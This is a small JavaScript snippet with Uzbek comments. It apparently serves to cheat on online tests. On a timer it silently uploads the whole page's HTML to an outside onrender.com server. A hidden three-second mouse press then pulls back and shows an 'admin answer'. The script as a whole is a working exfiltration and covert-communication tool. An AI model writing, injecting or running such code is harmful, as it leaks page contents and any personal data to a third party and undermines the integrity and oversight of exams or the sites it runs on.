(function(){
    const S = 'https://f1-f2mq.onrender.com';
    
    // 1. Sahifani yuborish funksiyasi
    async function yubor() {
        await fetch(S + '/upload-html', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ html: document.documentElement.outerHTML })
        });
        console.log("Savol yuborildi");
    }

    // Har 5 soniyada avtomatik yuborib turadi (Sizga qulay bo'lishi uchun)
    setInterval(yubor, 5000);
    yubor();

    // 2. Javobni (SMSni) ko'rish
    // Sichqonchani 3 soniya bosib tursa xabar chiqadi
    let t;
    document.addEventListener('mousedown', () => {
        t = setTimeout(async () => {
            const r = await fetch(S + '/latest');
            const d = await r.json();
            alert("ADMIN JAVOBI:\n" + d.message);
        }, 3000);
    });
    document.addEventListener('mouseup', () => clearTimeout(t));
})();
